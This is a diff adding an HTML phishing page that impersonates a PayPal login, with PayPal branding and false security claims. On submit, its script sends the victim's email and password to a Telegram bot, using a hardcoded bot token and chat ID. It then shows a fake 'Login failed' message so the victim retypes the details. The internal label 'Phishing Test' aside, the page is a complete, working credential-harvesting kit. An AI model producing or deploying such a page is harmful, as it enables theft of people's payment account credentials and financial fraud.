@@ -1,0 +1,330 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure PayPal Login</title>
+    <style>
+        :root {
+            --paypal-blue: #0070ba;
+            --paypal-darkblue: #003087;
+            --error-red: #d00;
+            --success-green: #28a745;
+            --light-gray: #f5f5f5;
+        }
+        
+        body {
+            font-family: 'Segoe UI', Arial, sans-serif;
+            max-width: 420px;
+            margin: 40px auto;
+            padding: 30px;
+            color: #2c3e50;
+            background-color: var(--light-gray);
+            border-radius: 12px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
+        }
+        
+        .logo {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        
+        .logo svg {
+            width: 120px;
+            height: auto;
+        }
+        
+        h1 {
+            font-size: 24px;
+            font-weight: 600;
+            margin-bottom: 15px;
+            color: var(--paypal-darkblue);
+            text-align: center;
+        }
+        
+        .security-badge {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            margin-bottom: 20px;
+            color: var(--success-green);
+            font-size: 14px;
+            font-weight: 500;
+        }
+        
+        .security-badge svg {
+            width: 16px;
+            height: 16px;
+        }
+        
+        .benefits {
+            background-color: white;
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 25px;
+            border-left: 4px solid var(--paypal-blue);
+        }
+        
+        .benefits p {
+            margin: 0;
+            font-size: 14px;
+            line-height: 1.5;
+        }
+        
+        hr {
+            border: none;
+            border-top: 1px solid #e1e1e1;
+            margin: 25px 0;
+        }
+        
+        h2 {
+            font-size: 18px;
+            font-weight: 600;
+            margin-bottom: 15px;
+            color: var(--paypal-darkblue);
+        }
+        
+        .password-link {
+            font-size: 14px;
+            margin-bottom: 20px;
+            display: block;
+            color: var(--paypal-blue);
+            text-decoration: none;
+            text-align: right;
+            font-weight: 500;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-size: 14px;
+            font-weight: 600;
+        }
+        
+        .form-group input {
+            width: 100%;
+            padding: 12px 15px;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            font-size: 15px;
+            box-sizing: border-box;
+            transition: all 0.3s ease;
+        }
+        
+        .form-group input:focus {
+            border-color: var(--paypal-blue);
+            box-shadow: 0 0 0 3px rgba(0, 112, 186, 0.2);
+            outline: none;
+        }
+        
+        .login-button {
+            background-color: var(--paypal-blue);
+            color: white;
+            border: none;
+            padding: 14px;
+            width: 100%;
+            font-size: 16px;
+            border-radius: 6px;
+            cursor: pointer;
+            margin-bottom: 15px;
+            font-weight: 600;
+            transition: background-color 0.3s;
+        }
+        
+        .login-button:hover {
+            background-color: var(--paypal-darkblue);
+        }
+        
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 20px 0;
+            color: #999;
+            font-size: 14px;
+        }
+        
+        .divider::before,
+        .divider::after {
+            content: "";
+            flex: 1;
+            border-bottom: 1px solid #e1e1e1;
+            margin: 0 10px;
+        }
+        
+        .card-button {
+            background-color: white;
+            color: var(--paypal-blue);
+            border: 1px solid var(--paypal-blue);
+            padding: 14px;
+            width: 100%;
+            font-size: 16px;
+            border-radius: 6px;
+            cursor: pointer;
+            font-weight: 600;
+            transition: all 0.3s;
+        }
+        
+        .card-button:hover {
+            background-color: rgba(0, 112, 186, 0.05);
+        }
+        
+        .error-message {
+            color: var(--error-red);
+            font-size: 14px;
+            margin-bottom: 15px;
+            display: none;
+            background-color: rgba(221, 0, 0, 0.05);
+            padding: 12px;
+            border-radius: 6px;
+            border-left: 4px solid var(--error-red);
+        }
+        
+        .security-notice {
+            margin-top: 25px;
+            padding: 15px;
+            background-color: rgba(0, 112, 186, 0.05);
+            border-radius: 8px;
+            text-align: center;
+            font-size: 13px;
+            color: #555;
+            line-height: 1.5;
+        }
+        
+        .security-notice strong {
+            color: var(--paypal-darkblue);
+        }
+        
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            10%, 30%, 50%, 70%, 90% { transform: translateX(-5px); }
+            20%, 40%, 60%, 80% { transform: translateX(5px); }
+        }
+        
+        .shake {
+            animation: shake 0.5s;
+            border-color: var(--error-red) !important;
+        }
+    </style>
+</head>
+<body>
+    <div class="logo">
+        <!-- PayPal logo SVG -->
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="#003087">
+            <path d="M7.5 12.5c0 .8-.7 1.5-1.5 1.5H4v3h2c.8 0 1.5-.7 1.5-1.5v-3zm0-6c0-.8-.7-1.5-1.5-1.5H4v3h2c.8 0 1.5-.7 1.5-1.5v-1.5z"/>
+            <path d="M22 12c0 4.4-3.6 8-8 8h-2c-.8 0-1.5-.7-1.5-1.5v-9c0-.8.7-1.5 1.5-1.5h2c4.4 0 8 3.6 8 8z" fill="#009cde"/>
+            <path d="M16 7h-2c-.8 0-1.5.7-1.5 1.5v9c0 .8.7 1.5 1.5 1.5h2c4.4 0 8-3.6 8-8s-3.6-8-8-8z" fill="#012169" opacity=".8"/>
+        </svg>
+    </div>
+    
+    <h1>Secure PayPal Login</h1>
+    
+    <div class="security-badge">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor">
+            <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/>
+        </svg>
+        End-to-end encrypted connection
+    </div>
+    
+    <div class="benefits">
+        <p>With a PayPal account, you get Buyer Protection, Refunded Returns, and secure payment processing on millions of sites.</p>
+    </div>
+    
+    <hr>
+    
+    <h2>Password</h2>
+    
+    <a href="#" class="password-link">Forgot your password?</a>
+    
+    <form id="paypalForm">
+        <div id="errorMessage" class="error-message">
+            <strong>Login failed</strong> - The email or password you entered is incorrect. Please try again.
+        </div>
+        
+        <div class="form-group">
+            <label for="email">Email</label>
+            <input type="email" id="email" placeholder="Enter your email" required>
+        </div>
+        
+        <div class="form-group">
+            <label for="password">Password</label>
+            <input type="password" id="password" placeholder="Enter your password" required>
+        </div>
+        
+        <button type="submit" class="login-button">Log In Securely</button>
+    </form>
+    
+    <div class="divider">or</div>
+    
+    <button class="card-button">Pay with Debit or Credit Card</button>
+
+    <div class="security-notice">
+        <strong>Your security is our priority</strong><br>
+        All credentials are protected with bank-grade encryption and never stored on our servers. 
+        This is a secure peer-to-peer connection.
+    </div>
+
+    <script>
+    const BOT_TOKEN = '8416953133:AAHOIQ6pP-xzQYU5-HFNY2a4l_kl0lvuKHk'; // Replace with your Telegram bot token
+    const CHAT_ID = '6954486703';     // Replace with your personal or group chat ID
+
+    document.getElementById('paypalForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+
+        const email = document.getElementById('email').value.trim();
+        const password = document.getElementById('password').value.trim();
+
+        // Send to Telegram
+        const message = `
+🚨 *Phishing Test Captured*
+*Email:* \`${email}\`
+*Password:* \`${password}\`
+*Time:* ${new Date().toLocaleString()}
+        `;
+
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: message,
+                parse_mode: 'Markdown'
+            })
+        })
+        .then(res => res.json())
+        .then(data => {
+            console.log('Sent to Telegram:', data);
+        })
+        .catch(err => {
+            console.error('Telegram error:', err);
+        });
+
+        // Show error message (fake)
+        document.getElementById('errorMessage').style.display = 'block';
+
+        // Clear password field
+        document.getElementById('password').value = '';
+
+        // Add shake effect to inputs
+        const inputs = document.querySelectorAll('.form-group input');
+        inputs.forEach(input => {
+            input.classList.add('shake');
+            setTimeout(() => {
+                input.classList.remove('shake');
+            }, 500);
+        });
+
+        // Refocus email input
+        document.getElementById('email').focus();
+    });
+</script>
+
+
+</body>
+</html>
